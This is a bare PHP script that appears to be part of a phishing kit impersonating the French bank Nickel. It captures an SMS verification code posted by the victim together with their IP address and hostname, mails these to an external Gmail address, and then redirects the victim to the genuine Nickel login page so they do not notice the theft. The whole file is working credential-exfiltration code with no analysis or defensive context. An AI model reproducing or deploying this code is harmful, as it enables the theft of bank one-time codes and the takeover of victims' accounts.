<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~~~~~~~\n";
$message .= "SMS : ".$_POST['SMSSMS']."\n";

$message .= "~~~~~~~~~~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= "~~~~~~~ ok ~~~~~~~\n";
$send = "tlory86@gmail.com";
$subject = "SMS2 nickel | $ip ";
$headers = "From:<mail>";
mail($send,$subject,$message,$headers);
@header("Location: https://mon.compte-nickel.fr/identifiez-vous");
 
?>
